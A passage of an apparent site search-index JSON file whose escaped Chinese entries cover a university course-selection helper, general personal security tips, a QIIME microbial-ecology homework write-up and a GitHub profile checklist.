\u5f00\u8bfe\u5b66\u9662 \uff0c\u4f8b\u5982 \u7ecf\u6d4e\u5b66\u9662 \uff0c\u67e5\u8be2 \u53ef\u89c1 \u5f00\u8bfe\u53f7 \u73b0\u5728\u53ef\u4ee5\u70b9\u51fb\uff0c\u627e\u5230\u4f60\u60f3\u9009\u7684\u8bfe\u7a0b\uff0c\u5373\u53ef\u8fdb\u5165\u9009\u8bfe \u5728\u9009\u8bfe\u5217\u8868\u4e2d\u663e\u793a \u67e5\u8001\u5e08\u7f51\u7ad9 \u4e0a\u7684\u8bc4\u5206\u6570\u636e\uff08\u5982\u679c\u6709\u591a\u6761\u6570\u636e\u5219\u90fd\u663e\u793a\uff09 \u53ef\u4ee5\u70b9\u5f00\u8bc4\u5206\u6570\u636e\u67e5\u770b\u8bc4\u8bba \u867d\u7136\u73b0\u5728\u6837\u5f0femmmm","title":"\u4f7f\u7528\u65b9\u6cd5"},{"location":"zjugrshelper/#_4","text":"\u4f7f\u7528\u9047\u5230bug\uff1f\u9700\u8981\u66f4\u591a\u529f\u80fd\uff1f\u6765\u63d0\u4e2aissue\u5427\uff1a https://github.com/zjuchenyuan/notebook/issues \u6b22\u8fce\u7ed9\u4e2astar\u54af\uff1a https://github.com/zjuchenyuan/notebook","title":"\u6b22\u8fce\u53cd\u9988\u4e0e\u8d21\u732e"},{"location":"%E8%B0%88%E8%B0%88%E5%AE%89%E5%85%A8/","text":"How to keep safe? \u00b6 The Big Brother Is Watching You \u95f7\u58f0\u53d1\u5927\u8d22\u624d\u662f\u6700\u543c\u6ef4 \u4efb\u4f55\u670d\u52a1\u5668\u3001\u670d\u52a1\u63d0\u4f9b\u5546\u4e0a\u7edd\u5bf9\u4e0d\u80fd\u660e\u6587\u5b58\u50a8\u6d89\u5bc6\u6587\u4ef6\u3001\u670d\u52a1\u5668\u5bc6\u94a5\u3001\u5bc6\u7801\u7b14\u8bb0 \u5907\u4efd\u6587\u4ef6\u3001\u5386\u53f2\u90ae\u4ef6\u7684\u5b89\u5168\u6027\u66f4\u5e94\u91cd\u89c6\uff0c\u53ca\u65f6\u6e05\u7a7a\u5386\u53f2\u6587\u4ef6\uff0c\u7ed9\u653b\u51fb\u8005\u66f4\u5c11\u7684\u7ebf\u7d22\u80fd\u6709\u6548\u52a0\u5927\u653b\u51fb\u96be\u5ea6 \u542f\u7528\u4e00\u5207\u80fd\u542f\u7528\u7684\u4e24\u6b65\u9a8c\u8bc1\uff0c\u4e0d\u8981\u4f7f\u7528\u6d4f\u89c8\u5668\u7684\u4fdd\u5b58\u5bc6\u7801\u529f\u80fd \u8ba9\u653b\u51fb\u8005\u8ff7\u5931\u5728\u4e00\u5927\u7fa4\u65e0\u7528\u6587\u4ef6\u4e2d\u6216\u8bb8\u662f\u4e00\u79cd\u597d\u65b9\u6cd5 \u5bf9\u6280\u672f\u3001\u6cd5\u5f8b\u5fc3\u5b58\u656c\u754f\uff0c\u5bf9\u5f85\u5b89\u5168\u4e0d\u80fd\u5077\u61d2\uff01 \u5468\u671f\u6027\u66f4\u6362\u5bc6\u7801\u548c\u670d\u52a1\u5668\u5bc6\u94a5","title":"How to keep safe?"},{"location":"%E8%B0%88%E8%B0%88%E5%AE%89%E5%85%A8/#how-to-keep-safe","text":"The Big Brother Is Watching You \u95f7\u58f0\u53d1\u5927\u8d22\u624d\u662f\u6700\u543c\u6ef4 \u4efb\u4f55\u670d\u52a1\u5668\u3001\u670d\u52a1\u63d0\u4f9b\u5546\u4e0a\u7edd\u5bf9\u4e0d\u80fd\u660e\u6587\u5b58\u50a8\u6d89\u5bc6\u6587\u4ef6\u3001\u670d\u52a1\u5668\u5bc6\u94a5\u3001\u5bc6\u7801\u7b14\u8bb0 \u5907\u4efd\u6587\u4ef6\u3001\u5386\u53f2\u90ae\u4ef6\u7684\u5b89\u5168\u6027\u66f4\u5e94\u91cd\u89c6\uff0c\u53ca\u65f6\u6e05\u7a7a\u5386\u53f2\u6587\u4ef6\uff0c\u7ed9\u653b\u51fb\u8005\u66f4\u5c11\u7684\u7ebf\u7d22\u80fd\u6709\u6548\u52a0\u5927\u653b\u51fb\u96be\u5ea6 \u542f\u7528\u4e00\u5207\u80fd\u542f\u7528\u7684\u4e24\u6b65\u9a8c\u8bc1\uff0c\u4e0d\u8981\u4f7f\u7528\u6d4f\u89c8\u5668\u7684\u4fdd\u5b58\u5bc6\u7801\u529f\u80fd \u8ba9\u653b\u51fb\u8005\u8ff7\u5931\u5728\u4e00\u5927\u7fa4\u65e0\u7528\u6587\u4ef6\u4e2d\u6216\u8bb8\u662f\u4e00\u79cd\u597d\u65b9\u6cd5 \u5bf9\u6280\u672f\u3001\u6cd5\u5f8b\u5fc3\u5b58\u656c\u754f\uff0c\u5bf9\u5f85\u5b89\u5168\u4e0d\u80fd\u5077\u61d2\uff01 \u5468\u671f\u6027\u66f4\u6362\u5bc6\u7801\u548c\u670d\u52a1\u5668\u5bc6\u94a5","title":"How to keep safe?"},{"location":"doc/biology/ecology/","text":"\u751f\u6001\u6570\u636e\u5904\u7406\uff0c\u4f7f\u7528QIIME \u00b6 \u4f5c\u4e1a\u8981\u6c42 \u00b6 De-novo OTU picking\u4ee5\u53caOTU table\u7684\u5236\u4f5c alpha\u591a\u6837\u6027\u5206\u6790\uff1a\u4f18\u52bf\u79cd(>5%/10%)\u7684Relative Abundance\u5206\u5e03\u56fe\uff1bRarefaction Curve( Shannon, Simpson, Observed species) beta\u591a\u6837\u6027\u5206\u6790\uff1a Unweighted/Weighted Unifrac PCoA\u5206\u6790 \u7fa4\u4f53\u6027\u5206\u6790\uff1aNMDS\u5206\u6790\u2013R \u5dee\u5f02\u5206\u6790\uff08Adonis\uff0cANOSIM\uff0cMRPP\uff09\u2013R \u83b7\u5f97\u6570\u636e Obtaining the data \u00b6 \u4ece\u7fa4\u5171\u4eab\u4e0b\u8f7d\u5230\u4e09\u4e2a\u6587\u4ef6\uff0c\u7b80\u4ecb\uff1a BF_Map.txt 5.10KB \u00b6 \u8fd9\u662f\u5bf9\u539f\u59cb\u6d4b\u5e8ffna\u6587\u4ef6\u7684\u63cf\u8ff0\uff0c\u662f\u539f\u59cb\u6570\u636e |SampleID|BarcodeSequence|LinkerPrimerSequence|Treatment|Plate|Description| | -------- | -----: | :----: | |\u6837\u672cID|\u7528\u4e8e\u533a\u5206\u6837\u672c\u7684\u5e8f\u5217|\u6d4b\u5e8f\u65f6\u52a0\u4e0a\u7684\u5e8f\u5217|\u6837\u672c\u7684\u5904\u7406\uff0cControl\u4e0eWarming||\u63cf\u8ff0\uff0c\u6709TagA,TagB,TagC| otu_table_F.txt 23.9MB \u00b6 OTU\u662f\u5728\u6570\u91cf\u5206\u7c7b\u5b66\u65b9\u9762\u4f5c\u4e3a\u5bf9\u8c61\u7684\u5206\u7c7b\u5355\u4f4d \u8ba1\u7b97\u5f97\u51fa\u7684OTU Table \u6bcf\u884c\u4e00\u4e2aOTU\uff0c\u5982\u679c\u5339\u914d\u5230\u6570\u636e\u5e93\u4e0a\u6709\u5fae\u751f\u7269\u7684\u7269\u79cd\u5206\u7c7b\u6570\u636e\uff0c\u4ee5\u53ca\u6bcf\u4e2a\u6837\u672c\u662f\u5426\u5305\u542b\u8fd9\u4e2aOTU\u2013\u5305\u542b\u4e3a1\uff0c\u4e0d\u5305\u542b\u4e3a0 otus_BF.rar 36.7MB \u00b6 \u5185\u542botus_BF\u6587\u4ef6\u5939\uff0c\u4e3a De novo OTU picking \u6b65\u9aa4\u7684\u751f\u6210\u7ed3\u679c \u4ece\u5934\u5f00\u59cb\u7684OTU\u7ec4\u88c5 De novo OTU picking \u00b6 \u7531\u4e8e\u7f3a\u5c11\u539f\u59cb\u6587\u4ef6\uff0c\u672c\u6b65\u9aa4\u65e0\u6cd5\u590d\u73b0\uff0c\u8fd0\u7b97\u7ed3\u679c\u4e3a\u7ed9\u51fa\u7684otus_BF.rar \u6b64\u6b65\u9aa4\u751f\u6210\u4e86 rep_set.tre \uff0c\u4f7f\u7528 FigTree \u8f6f\u4ef6\u8fdb\u884c\u67e5\u770b\uff1a \u67e5\u770b\u4ea7\u751f\u7684OTU Table \u00b6 summarize.txt \u4e00\u5171\u670950\u4e2a\u6837\u672c\uff0c\u53c2\u7167\u7ed9\u51fa\u7684\u539f\u59cbBF_Map.txt\uff0872\u4e2a\u6837\u672c\uff09\uff0c \u53d1\u73b0\u5176\u4e2d\u7684F.TagA.3C.12\u548cF.TagA.3C.13\u7684Count\u6570\u592a\u5c0f\u53ef\u4ee5\u5ffd\u7565\uff0c\u6bd4\u8f83\u4e24\u4e2a\u6587\u4ef6\u53d1\u73b0 ID\u4e3aTagA\u7684\u90fd\u6ca1\u6709\u51fa\u73b0\u5728\u7ed9\u51fa\u7684OTU Table\u4e2d \u6280\u672fPoint:\u7528Excel\u6bd4\u8f83\u4e24\u5217\u76f8\u540c\u5143\u7d20http://jingyan.baidu.com/article/c843ea0b7a2a7477921e4a47.html Make an OTU network \u00b6 \u4eba\u5bb6\u8bf4\u8981\u7528Cytoscape\uff0c\u6709\u5f85\u7814\u7a76 \u751f\u6210\u7684otu_network\u6587\u4ef6\u5939 \u6233\u8fd9\u91cc\u4e0b\u8f7d \u7269\u79cd\u5206\u7c7b\u7edf\u8ba1 Summarize communities by taxonomic composition \u00b6 \u751f\u6210\u7684taxa_summary\u6587\u4ef6\u5939,\u6233\u6211\u4e0b\u8f7d \u8fd9\u91cc\u662f\u91cd\u70b9 \u6253\u5f00taxa_summary/taxa_summary_plots\u6587\u4ef6\u5939\uff0c\u91cc\u9762\u6709\u4e24\u4e2a\u7f51\u9875\uff0c \u7f51\u9875\u6253\u5f00\u540e5\u5f20\u56fe\uff0c\u6bcf\u5f20\u56fe\u7684\u6a2a\u5750\u6807\u90fd\u662f50\u4e2a\u6837\u672c\uff0c\u4ece\u4e0a\u5230\u4e0b\u5206\u7c7b\u9636\u5143\u8d8a\u6765\u8d8a\u7ec6 \u9009\u62e9\u6700\u9ad8\u5c42\u6b21\u7684\u8fd9\u5f20bar\u56fe\u5427\uff1a \u89e3\u538b\u538b\u7f29\u5305\u540e\u6253\u5f00\u7f51\u9875\uff0c\u7528\u9f20\u6807\u629a\u6478\u8fd9\u5f20\u56fe\u53ef\u4ee5\u770b\u5230\u5206\u7c7b\u4fe1\u606f \u5e95\u4e0b\u7ea2\u8272\u662f\u6700\u591a\u7684\uff0c\u662fOther \u5176\u6b21\u6700\u591a\u7684\u770b\u8d77\u6765\u662f\u4e0a\u8fb9\u7684\u7ea2\u8272\u7684\uff0cProteobacteria \u4ea7\u751f\u70ed\u56feMake a taxonomy heatmap \u00b6 \u8ba1\u7b97alpha\u591a\u6837\u6027 \u00b6 \u751f\u6210\u7684arare\u6587\u4ef6\u5939\u6233\u6211\u4e0b\u8f7d alpha\u591a\u6837\u6027\u7684\u8ba1\u7b97\u7ed3\u679c\u5728arare/alpha_div_collated\u4e2d\uff0c\u91cc\u9762\u6709 shannon.txt simpson.txt observed_otus.txt \u8fd9\u5c31\u662fPPT\u8981\u6c42\u7684Observed species \u6bcf\u4e00\u5217\u662f\u4e00\u4e2a\u6837\u672c \u6bcf\u4e00\u884c\u884c\u662f\u53d6\u6837\u5927\u5c0f+\u8fed\u4ee3\u6b21\u6570\uff1a rarefaction_##_#.txt: the first set of numbers represents the number of sequences sampled, and the last number represents the iteration number \u7528\u4e0d\u540c\u7684\u91c7\u6837\u5927\u5c0f\u53ef\u4ee5\u5f97\u5230\u4e0d\u540c\u7684\u6570\u503c\uff0c\u5c31\u53ef\u4ee5\u753b\u51fa\u4e0b\u9762\u8fd9\u4e9b\u56fe \u770balpha\u7a00\u758f\u56fe \u00b6 \u9996\u5148\u4e86\u89e3\u8fd9\u662f\u4e2a\u4ec0\u4e48\u4e1c\u897f Wikipedia \u95ee\u9898\uff1a\u5982\u679c\u4f7f\u7528Category:Treatment, \u6570\u636e\u4e0a\u5f88\u591aNaN\uff0c\u770b\u4e0d\u51fa\u4e0d\u540c\u5904\u7406\u7684\u663e\u8457\u6027\u5dee\u5f02 \u8ba1\u7b97beta\u591a\u6837\u6027 Compute beta diversity and generate ordination plots \u00b6 bdiv_even146.zip\u6233\u6211\u4e0b\u8f7d Unweighted \u00b6 \u7ea2\u8272Control \u84dd\u8272Warming Treatment\u4e0a\u6ca1\u6709\u663e\u8457\u6027\u533a\u522b \u90a3\u4ec0\u4e48\u5177\u6709\u663e\u8457\u6027\u533a\u522b\u5462\uff1f \u624b\u5de5\u6807\u4e0a\u989c\u8272\uff1a \u9ec4\u8272 TagC_13 \u7eff\u8272 TagB_13 \u84dd\u8272 TagC_12 \u7ea2\u8272 TagB_12 \u53d1\u73b0 \u6837\u672c\u6700\u540e\u7684\u6807\u53f712\u4e0e13\u624d\u662f\u6700\u663e\u8457\u7684\u533a\u522b\u6765\u6e90 \uff01 Weighted \u00b6 \u540c\u6837\u5728Treatment\u4e0a\u6ca1\u6709\u663e\u8457\u6027\u5dee\u5f02","title":"Ecology"},{"location":"doc/biology/ecology/#qiime","text":"","title":"\u751f\u6001\u6570\u636e\u5904\u7406\uff0c\u4f7f\u7528QIIME"},{"location":"doc/biology/ecology/#_1","text":"De-novo OTU picking\u4ee5\u53caOTU table\u7684\u5236\u4f5c alpha\u591a\u6837\u6027\u5206\u6790\uff1a\u4f18\u52bf\u79cd(>5%/10%)\u7684Relative Abundance\u5206\u5e03\u56fe\uff1bRarefaction Curve( Shannon, Simpson, Observed species) beta\u591a\u6837\u6027\u5206\u6790\uff1a Unweighted/Weighted Unifrac PCoA\u5206\u6790 \u7fa4\u4f53\u6027\u5206\u6790\uff1aNMDS\u5206\u6790\u2013R \u5dee\u5f02\u5206\u6790\uff08Adonis\uff0cANOSIM\uff0cMRPP\uff09\u2013R","title":"\u4f5c\u4e1a\u8981\u6c42"},{"location":"doc/biology/ecology/#obtaining-the-data","text":"\u4ece\u7fa4\u5171\u4eab\u4e0b\u8f7d\u5230\u4e09\u4e2a\u6587\u4ef6\uff0c\u7b80\u4ecb\uff1a","title":"\u83b7\u5f97\u6570\u636e Obtaining the data"},{"location":"doc/biology/ecology/#bf_maptxt-510kb","text":"\u8fd9\u662f\u5bf9\u539f\u59cb\u6d4b\u5e8ffna\u6587\u4ef6\u7684\u63cf\u8ff0\uff0c\u662f\u539f\u59cb\u6570\u636e |SampleID|BarcodeSequence|LinkerPrimerSequence|Treatment|Plate|Description| | -------- | -----: | :----: | |\u6837\u672cID|\u7528\u4e8e\u533a\u5206\u6837\u672c\u7684\u5e8f\u5217|\u6d4b\u5e8f\u65f6\u52a0\u4e0a\u7684\u5e8f\u5217|\u6837\u672c\u7684\u5904\u7406\uff0cControl\u4e0eWarming||\u63cf\u8ff0\uff0c\u6709TagA,TagB,TagC|","title":"BF_Map.txt 5.10KB"},{"location":"doc/biology/ecology/#otu_table_ftxt-239mb","text":"OTU\u662f\u5728\u6570\u91cf\u5206\u7c7b\u5b66\u65b9\u9762\u4f5c\u4e3a\u5bf9\u8c61\u7684\u5206\u7c7b\u5355\u4f4d \u8ba1\u7b97\u5f97\u51fa\u7684OTU Table \u6bcf\u884c\u4e00\u4e2aOTU\uff0c\u5982\u679c\u5339\u914d\u5230\u6570\u636e\u5e93\u4e0a\u6709\u5fae\u751f\u7269\u7684\u7269\u79cd\u5206\u7c7b\u6570\u636e\uff0c\u4ee5\u53ca\u6bcf\u4e2a\u6837\u672c\u662f\u5426\u5305\u542b\u8fd9\u4e2aOTU\u2013\u5305\u542b\u4e3a1\uff0c\u4e0d\u5305\u542b\u4e3a0","title":"otu_table_F.txt 23.9MB"},{"location":"doc/biology/ecology/#otus_bfrar-367mb","text":"\u5185\u542botus_BF\u6587\u4ef6\u5939\uff0c\u4e3a De novo OTU picking \u6b65\u9aa4\u7684\u751f\u6210\u7ed3\u679c","title":"otus_BF.rar 36.7MB"},{"location":"doc/biology/ecology/#otu-de-novo-otu-picking","text":"\u7531\u4e8e\u7f3a\u5c11\u539f\u59cb\u6587\u4ef6\uff0c\u672c\u6b65\u9aa4\u65e0\u6cd5\u590d\u73b0\uff0c\u8fd0\u7b97\u7ed3\u679c\u4e3a\u7ed9\u51fa\u7684otus_BF.rar \u6b64\u6b65\u9aa4\u751f\u6210\u4e86 rep_set.tre \uff0c\u4f7f\u7528 FigTree \u8f6f\u4ef6\u8fdb\u884c\u67e5\u770b\uff1a","title":"\u4ece\u5934\u5f00\u59cb\u7684OTU\u7ec4\u88c5 De novo OTU picking"},{"location":"doc/biology/ecology/#otu-table","text":"summarize.txt \u4e00\u5171\u670950\u4e2a\u6837\u672c\uff0c\u53c2\u7167\u7ed9\u51fa\u7684\u539f\u59cbBF_Map.txt\uff0872\u4e2a\u6837\u672c\uff09\uff0c \u53d1\u73b0\u5176\u4e2d\u7684F.TagA.3C.12\u548cF.TagA.3C.13\u7684Count\u6570\u592a\u5c0f\u53ef\u4ee5\u5ffd\u7565\uff0c\u6bd4\u8f83\u4e24\u4e2a\u6587\u4ef6\u53d1\u73b0 ID\u4e3aTagA\u7684\u90fd\u6ca1\u6709\u51fa\u73b0\u5728\u7ed9\u51fa\u7684OTU Table\u4e2d \u6280\u672fPoint:\u7528Excel\u6bd4\u8f83\u4e24\u5217\u76f8\u540c\u5143\u7d20http://jingyan.baidu.com/article/c843ea0b7a2a7477921e4a47.html","title":"\u67e5\u770b\u4ea7\u751f\u7684OTU Table"},{"location":"doc/biology/ecology/#make-an-otu-network","text":"\u4eba\u5bb6\u8bf4\u8981\u7528Cytoscape\uff0c\u6709\u5f85\u7814\u7a76 \u751f\u6210\u7684otu_network\u6587\u4ef6\u5939 \u6233\u8fd9\u91cc\u4e0b\u8f7d","title":"Make an OTU network"},{"location":"doc/biology/ecology/#summarize-communities-by-taxonomic-composition","text":"\u751f\u6210\u7684taxa_summary\u6587\u4ef6\u5939,\u6233\u6211\u4e0b\u8f7d \u8fd9\u91cc\u662f\u91cd\u70b9 \u6253\u5f00taxa_summary/taxa_summary_plots\u6587\u4ef6\u5939\uff0c\u91cc\u9762\u6709\u4e24\u4e2a\u7f51\u9875\uff0c \u7f51\u9875\u6253\u5f00\u540e5\u5f20\u56fe\uff0c\u6bcf\u5f20\u56fe\u7684\u6a2a\u5750\u6807\u90fd\u662f50\u4e2a\u6837\u672c\uff0c\u4ece\u4e0a\u5230\u4e0b\u5206\u7c7b\u9636\u5143\u8d8a\u6765\u8d8a\u7ec6 \u9009\u62e9\u6700\u9ad8\u5c42\u6b21\u7684\u8fd9\u5f20bar\u56fe\u5427\uff1a \u89e3\u538b\u538b\u7f29\u5305\u540e\u6253\u5f00\u7f51\u9875\uff0c\u7528\u9f20\u6807\u629a\u6478\u8fd9\u5f20\u56fe\u53ef\u4ee5\u770b\u5230\u5206\u7c7b\u4fe1\u606f \u5e95\u4e0b\u7ea2\u8272\u662f\u6700\u591a\u7684\uff0c\u662fOther \u5176\u6b21\u6700\u591a\u7684\u770b\u8d77\u6765\u662f\u4e0a\u8fb9\u7684\u7ea2\u8272\u7684\uff0cProteobacteria","title":"\u7269\u79cd\u5206\u7c7b\u7edf\u8ba1 Summarize communities by taxonomic composition"},{"location":"doc/biology/ecology/#make-a-taxonomy-heatmap","text":"","title":"\u4ea7\u751f\u70ed\u56feMake a taxonomy heatmap"},{"location":"doc/biology/ecology/#alpha","text":"\u751f\u6210\u7684arare\u6587\u4ef6\u5939\u6233\u6211\u4e0b\u8f7d alpha\u591a\u6837\u6027\u7684\u8ba1\u7b97\u7ed3\u679c\u5728arare/alpha_div_collated\u4e2d\uff0c\u91cc\u9762\u6709 shannon.txt simpson.txt observed_otus.txt \u8fd9\u5c31\u662fPPT\u8981\u6c42\u7684Observed species \u6bcf\u4e00\u5217\u662f\u4e00\u4e2a\u6837\u672c \u6bcf\u4e00\u884c\u884c\u662f\u53d6\u6837\u5927\u5c0f+\u8fed\u4ee3\u6b21\u6570\uff1a rarefaction_##_#.txt: the first set of numbers represents the number of sequences sampled, and the last number represents the iteration number \u7528\u4e0d\u540c\u7684\u91c7\u6837\u5927\u5c0f\u53ef\u4ee5\u5f97\u5230\u4e0d\u540c\u7684\u6570\u503c\uff0c\u5c31\u53ef\u4ee5\u753b\u51fa\u4e0b\u9762\u8fd9\u4e9b\u56fe","title":"\u8ba1\u7b97alpha\u591a\u6837\u6027"},{"location":"doc/biology/ecology/#alpha_1","text":"\u9996\u5148\u4e86\u89e3\u8fd9\u662f\u4e2a\u4ec0\u4e48\u4e1c\u897f Wikipedia \u95ee\u9898\uff1a\u5982\u679c\u4f7f\u7528Category:Treatment, \u6570\u636e\u4e0a\u5f88\u591aNaN\uff0c\u770b\u4e0d\u51fa\u4e0d\u540c\u5904\u7406\u7684\u663e\u8457\u6027\u5dee\u5f02","title":"\u770balpha\u7a00\u758f\u56fe"},{"location":"doc/biology/ecology/#beta-compute-beta-diversity-and-generate-ordination-plots","text":"bdiv_even146.zip\u6233\u6211\u4e0b\u8f7d","title":"\u8ba1\u7b97beta\u591a\u6837\u6027 Compute beta diversity and generate ordination plots"},{"location":"doc/biology/ecology/#unweighted","text":"\u7ea2\u8272Control \u84dd\u8272Warming Treatment\u4e0a\u6ca1\u6709\u663e\u8457\u6027\u533a\u522b \u90a3\u4ec0\u4e48\u5177\u6709\u663e\u8457\u6027\u533a\u522b\u5462\uff1f \u624b\u5de5\u6807\u4e0a\u989c\u8272\uff1a \u9ec4\u8272 TagC_13 \u7eff\u8272 TagB_13 \u84dd\u8272 TagC_12 \u7ea2\u8272 TagB_12 \u53d1\u73b0 \u6837\u672c\u6700\u540e\u7684\u6807\u53f712\u4e0e13\u624d\u662f\u6700\u663e\u8457\u7684\u533a\u522b\u6765\u6e90 \uff01","title":"Unweighted"},{"location":"doc/biology/ecology/#weighted","text":"\u540c\u6837\u5728Treatment\u4e0a\u6ca1\u6709\u663e\u8457\u6027\u5dee\u5f02","title":"Weighted"},{"location":"doc/github/github_profile_checklist/","text":"Github \u68c0\u67e5\u8868 [\u6c42\u804c\u5411] \u00b6 \u672c\u6587\u6863\u7ffb\u8bd1\u81eaUdacity\u8bfe\u7a0b\u8d44\u6599\uff0c \u539f\u6587\u5728\u6b64 \u4e00\u822c\u6027\u7684 \u00b6 \u6211\u5728Github\u4e0a\u81f3\u5c11\u67094\u4e2a\u81ea\u5df1\u7684\u9879\u76ee \u6211\u6709\u6301\u7eed\u6027\u5730\u4e3a\u9879\u76ee\u4f5c\u51fa\u63d0\u4ea4 \u81f3\u5c11\u4e24\u5468\u6bcf\u5929\u90fd\u575a\u6301\u63d0\u4ea4\uff0c\u65e0\u8bba\u63d0\u4ea4\u6709\u591a\u4e48\u5c0f \u6211\u53c2\u4e0e\u8fc7\u81f3\u5c11\u4e00\u4e2a\u5f00\u6e90\u9879\u76ee \u4e2a\u4eba\u4fe1\u606f \u00b6 1.\u6211\u6709\u4e00\u4e2a\u6b63\u5f0f\u7684github\u7528\u6237\u540d\uff0c\u5982\u6709\u53ef\u80fd\u8fd9\u4e2a\u7528\u6237\u540d\u5c31\u662f\u6211\u7684\u540d\u5b57 2.\u6211\u6709\u6b63\u5f0f\u7684\u4e2a\u4eba\u5934\u50cf\uff0c\u5efa\u8bae\u4f7f\u7528\u81ea\u4fe1\u9633\u5149\u7684\u4e2a\u4eba\u7167\u7247 3.URL\u3001\u516c\u53f8\u3001\u90ae\u7bb1\u90e8\u5206\u7b49\u4e2a\u4eba\u4fe1\u606f\u4e0d\u4e3a\u7a7a\u4e14\u4fdd\u6301\u6700\u65b0 \u9879\u76ee \u00b6 1.\u6211\u81f3\u5c11\u5bf9\u6211\u60f3\u5173\u6ce8\u7684\u9879\u76ee\u7ed9\u51fa\u4e00\u4e2aStar 2.\u6211\u7684\u9879\u76ee\u6709\u4e00\u4e2a\u5408\u7406\u7684\u540d\u79f0\uff08\u53ef\u4ee5\u5728\u9879\u76ee\u9007Settings\u4e2d\u4fee\u6539\uff09 3.\u6211\u7684\u9879\u76ee\u6709\u5b8c\u6574\u7684README\uff0c\u8bf4\u660e\u521b\u5efa\u8fd9\u4e2a\u9879\u76ee\u7684\u76ee\u7684\uff0c\u4f7f\u7528\u8fd9\u4e2a\u9879\u76ee\u7684\u65b9\u6cd5\uff0c\u5bfb\u6c42\u600e\u6837\u7684\u5408\u4f5c\u3002(Fork\u7684\u9879\u76ee\u4e0d\u9700\u8981\u4fee\u6539README) 4.\u9879\u76ee\u7684\u6240\u6709\u4fee\u6539\u90fd\u8981\u6709\u63d0\u4ea4\u4fe1\u606f\u6765\u89e3\u91ca\u8fdb\u884c\u7684\u4fee\u6539 5.\u9075\u5faa\u63d0\u4ea4\u4fe1\u606f\u7684\u98ce\u683c\uff0c\u6233\u8fd9\u91cc -> http://udacity.github.io/git-styleguide/","title":"Github \u68c0\u67e5\u8868 [\u6c42\u804c\u5411]"},{"location":"doc/github/github_profile_checklist/#github","text":"\u672c\u6587\u6863\u7ffb\u8bd1\u81eaUdacity\u8bfe\u7a0b\u8d44\u6599\uff0c \u539f\u6587\u5728\u6b64","title":"Github \u68c0\u67e5\u8868 [\u6c42\u804c\u5411]"},{"location":"doc/github/github_profile_checklist/#_1","text":"\u6211\u5728Github\u4e0a\u81f3\u5c11\u67094\u4e2a\u81ea\u5df1\u7684\u9879\u76ee \u6211\u6709\u6301\u7eed\u6027\u5730\u4e3a\u9879\u76ee\u4f5c\u51fa\u63d0\u4ea4 \u81f3\u5c11\u4e24\u5468\u6bcf\u5929\u90fd\u575a\u6301\u63d0\u4ea4\uff0c\u65e0\u8bba\u63d0\u4ea4\u6709\u591a\u4e48\u5c0f \u6211\u53c2\u4e0e\u8fc7\u81f3\u5c11\u4e00\u4e2a\u5f00\u6e90\u9879\u76ee","title":"\u4e00\u822c\u6027\u7684"},{"location":"doc/github/github_profile_checklist/#_2","text":"1.\u6211\u6709\u4e00\u4e2a\u6b63\u5f0f\u7684github\u7528\u6237\u540d\uff0c\u5982\u6709\u53ef\u80fd\u8fd9\u4e2a\u7528\u6237\u540d\u5c31\u662f\u6211\u7684\u540d\u5b57 2.\u6211\u6709\u6b63\u5f0f\u7684\u4e2a\u4eba\u5934\u50cf\uff0c\u5efa\u8bae\u4f7f\u7528\u81ea\u4fe1\u9633\u5149\u7684\u4e2a\u4eba\u7167\u7247 3.URL\u3001\u516c\u53f8\u3001\u90ae\u7bb1\u90e8\u5206\u7b49\u4e2a\u4eba\u4fe1\u606f\u4e0d\u4e3a\u7a7a\u4e14\u4fdd\u6301\u6700\u65b0","title":"\u4e2a\u4eba\u4fe1\u606f"},{"location":"doc/github/github_profile_checklist/#_3","text":"1.\u6211\u81f3\u5c11\u5bf9\u6211\u60f3\u5173\u6ce8\u7684\u9879\u76ee\u7ed9\u51fa\u4e00\u4e2aStar 2.\u6211\u7684\u9879\u76ee\u6709\u4e00\u4e2a\u5408\u7406\u7684\u540d\u79f0\uff08\u53ef\u4ee5\u5728\u9879\u76ee\u9007Settings\u4e2d\u4fee\u6539\uff09 3.\u6211\u7684\u9879\u76ee\u6709\u5b8c\u6574\u7684README\uff0c\u8bf4\u660e\u521b\u5efa\u8fd9\u4e2a\u9879\u76ee\u7684\u76ee\u7684\uff0c\u4f7f\u7528\u8fd9\u4e2a\u9879\u76ee\u7684\u65b9\u6cd5\uff0c\u5bfb\u6c42\u600e\u6837\u7684\u5408\u4f5c\u3002(Fork\u7684\u9879\u76ee\u4e0d\u9700\u8981\u4fee\u6539README) 4.\u9879\u76ee\u7684\u6240\u6709\u4fee\u6539\u90fd\u8981\u6709\u63d0\u4ea4\u4fe1\u606f\u6765\u89e3\u91ca\u8fdb\u884c\u7684\u4fee\u6539 5.\u9075\u5faa\u63d0\u4ea4\u4fe1\u606f\u7684\u98ce\u683c\uff0c\u6233\u8fd9\u91cc -> http://udacity.github.io/git-styleguide/","title":"\u9879\u76ee"}]}